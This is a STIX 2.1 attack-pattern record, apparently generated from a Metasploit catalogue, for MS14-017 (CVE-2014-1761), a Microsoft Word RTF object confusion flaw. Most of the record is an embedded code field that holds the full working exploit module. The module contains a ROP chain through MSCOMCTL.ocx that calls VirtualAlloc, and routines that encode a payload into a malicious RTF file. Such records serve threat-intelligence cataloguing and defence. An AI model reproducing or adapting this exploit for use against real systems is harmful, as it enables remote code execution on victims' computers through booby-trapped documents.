{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60ed3993-6452-4d59-bef1-cf808d3378ae",
    "created": "2024-08-14T16:37:03.399856Z",
    "modified": "2024-08-14T16:37:03.39986Z",
    "name": "\"MS14-017 Microsoft Word RTF Object Confusion\"",
    "description": " This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a listoverridecount field can be modified to treat one structure as another.  This bug was originally seen being exploited in the wild starting in April 2014. This module was created by reversing a public malware sample. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms14_017_rtf.rb",
            "external_id": "ms14_017_rtf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1761"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.mcafee.com/mcafee-labs/close-look-rtf-zero-day-attack-cve-2014-1761-shows-sophistication-attackers"
        },
        {
            "source_name": "reference",
            "url": "https://www.virustotal.com/en/file/e378eef9f4ea1511aa5e368cb0e52a8a68995000b8b1e6207717d9ed09e8555a/analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"MS14-017 Microsoft Word RTF Object Confusion\",\n      'Description'    => %q{\n        This module creates a malicious RTF file that when opened in\n        vulnerable versions of Microsoft Word will lead to code execution.\n        The flaw exists in how a listoverridecount field can be modified\n        to treat one structure as another.\n\n        This bug was originally seen being exploited in the wild starting\n        in April 2014. This module was created by reversing a public\n        malware sample.\n      },\n      'Author'         =>\n        [\n          'Haifei Li', # vulnerability analysis\n          'Spencer McIntyre',\n          'unknown' # malware author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        ['CVE', '2014-1761'],\n        ['MSB', 'MS14-017'],\n        ['URL', 'http://blogs.mcafee.com/mcafee-labs/close-look-rtf-zero-day-attack-cve-2014-1761-shows-sophistication-attackers'],\n        ['URL', 'https://www.virustotal.com/en/file/e378eef9f4ea1511aa5e368cb0e52a8a68995000b8b1e6207717d9ed09e8555a/analysis/']\n      ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Payload'        =>\n        {\n          'StackAdjustment' => -3500,\n          'Space'           => 375,\n          'DisableNops'     => true\n        },\n      'Targets'        =>\n        [\n          # winword.exe v14.0.7116.5000 (SP2)\n          [ 'Microsoft Office 2010 SP2 English on Windows 7 SP1 English',   {  } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2014-04-01',\n      'Notes'          =>\n        {\n          'Stability'   => [ CRASH_SERVICE_DOWN, ],\n          'SideEffects' => [ SCREEN_EFFECTS, ],\n        },\n    ))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.rtf'])\n      ])\n  end\n\n  def exploit\n    junk = rand(0xffffffff)\n    rop_chain = [\n      0x275de6ae, # ADD ESP,0C # RETN [MSCOMCTL.ocx]\n      junk,\n      junk,\n      0x27594a2c, # PUSH ECX # POP ESP # AND DWORD PTR [ESI+64],0FFFFFFFB # POP ESI # POP ECX # RETN [MSCOMCTL.ocx]\n      0x2758b042, # RETN [MSCOMCTL.ocx]\n      0x2761bdea, # POP EAX # RETN [MSCOMCTL.ocx]\n      0x275811c8, # ptr to &VirtualAlloc() [IAT MSCOMCTL.ocx]\n      0x2760ea66, # JMP [EAX] [MSCOMCTL.ocx]\n      0x275e0081, # POP ECX # RETN [MSCOMCTL.ocx]\n      0x40000000,\n      0x00100000,\n      0x00003000,\n      0x00000040,\n      0x00001000,\n      0x275fbcfc, # PUSH ESP # POP EDI # POP ESI # RETN 8 [MSCOMCTL.ocx]\n      junk,\n      0x275e0861, # MOV EAX,EDI # POP EDI # POP ESI # RETN [MSCOMCTL.ocx]\n      junk,\n      junk,\n      junk,\n      junk,\n      0x275ebac1, # XCHG EAX,ESI # NOP # ADD EAX,MSORES+0x13000000 # RETN 4 [MSCOMCTL.ocx]\n      0x275e0327, # POP EDI # RETN [MSCOMCTL.ocx]\n      junk,\n      0x40000000,\n      0x275ceb04, # REP MOVS BYTE [EDI],BYTE [ESI] # XOR EAX,EAX # JMP MSCOMCTL!DllGetClassObject0x3860 [MSCOMCTL.ocx]\n      junk,\n      junk,\n      junk,\n      junk,\n      0x40000040\n    ].pack(\"V*\")\n\n    exploit_data  = [ junk ].pack(\"v\")\n    exploit_data << rop_chain\n    exploit_data << payload.encoded\n    exploit_data << make_nops(exploit_data.length % 2)\n    exploit_data  = exploit_data.unpack(\"v*\")\n    exploit_data  = exploit_data.map { |word| \" ?\\\\u-#{0x10000 - word}\" }\n    exploit_data  = exploit_data.join\n\n    template_part1 = 0x1e04\n    template_path = ::File.join(Msf::Config.data_directory, \"exploits\", \"cve-2014-1761.rtf\")\n    template_rtf = ::File.open(template_path, 'rb')\n\n    exploit_rtf  = template_rtf.read(template_part1)\n    exploit_rtf << exploit_data\n    exploit_rtf << template_rtf.read\n\n    file_create(exploit_rtf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-01",
    "x_mitre_platforms": [
        "win'"
    ]
}